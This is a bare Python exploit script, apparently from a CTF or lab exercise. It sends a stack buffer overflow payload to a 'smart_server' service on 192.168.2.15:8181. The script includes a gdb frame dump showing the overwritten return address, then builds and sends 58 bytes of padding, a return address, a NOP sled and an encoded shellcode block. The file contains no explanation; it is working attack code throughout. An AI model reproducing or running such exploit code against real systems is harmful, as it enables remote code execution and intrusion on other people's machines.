import socket 
import struct
# real target kubernetes.docker.local.com
IP = "192.168.2.15"
PORT = 8181
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((IP, PORT))
"""
 Stack level 0, frame at 0xffffcbb0:
 eip = 0x5655631f in checkAuth (smart_server.c:111); saved eip = 0x42424242
 called by frame at 0xffffcbb4
 source language c.
 Arglist at 0xffffcba8, args: secret=0x90909090 <error: Cannot access memory at address 0x90909090>
 Locals at 0xffffcba8, Previous frame's sp is 0xffffcbb0
 Saved registers:
  ebx at 0xffffcba4, ebp at 0xffffcba8, eip at 0xffffcbac
"""
offset =  'A' * 58
eip =  struct.pack("<I", 0xffffcbb0)
nops = "\x90" * 128
buf =  b""
buf += b"\xbb\x73\xc5\x3d\x67\xd9\xcf\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x1f\x31\x58\x15\x03\x58\x15\x83\xe8\xfc\xe2"
buf += b"\x86\xaf\x37\x39\x59\xeb\xbf\x26\xca\x48\x13\xc3\xee"
buf += b"\xfe\xf5\x9a\x0f\x33\x79\x0b\x94\xa4\xba\x9c\x28\x36"
buf += b"\x53\xdf\x2c\x29\xff\x56\xcd\x23\x99\x30\x5d\xe5\x32"
buf += b"\x48\xbc\x46\x70\xca\xbb\x89\xf3\xd2\x8d\x7d\x39\x8d"
buf += b"\xb3\x7e\x41\x4d\xeb\x14\x41\x27\x0e\x60\xa2\x86\xd9"
buf += b"\xbf\xa5\x6c\x19\x46\x1b\x85\xbe\x0b\x64\xe3\xc0\x7b"
buf += b"\x6b\x13\x49\x98\xaa\xf8\x45\x9e\xce\xf3\xe5\x5d\xdc"
buf += b"\x8c\x80\x5e\xa6\x9c\xd1\xd7\xb6\x04\x57\xc3\x88\x34"
buf += b"\x5a\x8c\x6c\xfa\x1c\x8f\x91\x1a\x64\x8e\x6d\xdd\x94"
buf += b"\x2a\x6c\xdd\x94\x4c\xa2\x5d"
packet = offset + eip + nops + buf
socket.send(packet)
socket.close()